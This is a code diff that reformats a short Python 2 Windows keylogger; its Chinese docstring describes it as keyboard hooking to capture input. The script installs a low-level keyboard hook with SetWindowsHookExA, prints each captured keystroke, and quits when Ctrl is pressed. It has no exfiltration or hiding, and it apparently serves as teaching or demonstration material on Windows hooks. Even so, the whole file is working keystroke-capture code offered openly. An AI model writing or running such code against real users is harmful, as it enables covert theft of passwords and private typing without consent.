@@ -1,45 +1,49 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+"""键盘钩取，获取键盘输入"""
+
 import sys
 from ctypes import *
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 
 
-user32 = windll.user32                                                            #(1)
-kernel32 = windll.kernel32
-
-WH_KEYBOARD_LL=13                                                                 #(2)
-WM_KEYDOWN=0x0100
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
 CTRL_CODE = 162
 
-class KeyLogger:                                                                  #(3)
+user32 = windll.user32
+kernel32 = windll.kernel32
+
+
+class KeyLogger:
     def __init__(self):
-        self.lUser32     = user32
-        self.hooked     = None
-    
-    def installHookProc(self, pointer):                                           #(4)
-        self.hooked = self.lUser32.SetWindowsHookExA( 
-                        WH_KEYBOARD_LL, 
-                        pointer, 
-                        kernel32.GetModuleHandleW(None), 
-                        0
-        )
+        self.lUser32 = user32
+        self.hooked = None
+
+    def installHookProc(self, pointer):
+        self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)
         if not self.hooked:
             return False
         return True
-    
-    def uninstallHookProc(self):                                                  #(5)
+
+    def uninstallHookProc(self):
         if self.hooked is None:
             return
         self.lUser32.UnhookWindowsHookEx(self.hooked)
         self.hooked = None
 
-def getFPTR(fn):                                                                  #(6)
+
+def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
     return CMPFUNC(fn)
 
-def hookProc(nCode, wParam, lParam):                                              #(7)
+
+def hookProc(nCode, wParam, lParam):
     if wParam is not WM_KEYDOWN:
         return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)
+
     hookedKey = chr(lParam[0])
     print hookedKey
     if(CTRL_CODE == int(lParam[0])):
@@ -48,14 +52,17 @@ def hookProc(nCode, wParam, lParam):                                            
         sys.exit(-1)
     return user32.CallNextHookEx(keyLogger.hooked, nCode, wParam, lParam)     
 
-def startKeyLog():                                                                 #(8)
-     msg = MSG()
-     user32.GetMessageA(byref(msg),0,0,0)
-    
-keyLogger = KeyLogger() #start of hook process                                     #(9)
-pointer = getFPTR(hookProc) 
 
-if keyLogger.installHookProc(pointer):
-    print "installed keyLogger"
+def startKeyLog():
+    msg = MSG()
+    user32.GetMessageA(byref(msg),0,0,0)
 
-startKeyLog()
+
+if __name__ == '__main__':
+    keyLogger = KeyLogger()
+    pointer = getFPTR(hookProc)
+
+    if keyLogger.installHookProc(pointer):
+        print "installed keyLogger"
+
+    startKeyLog()
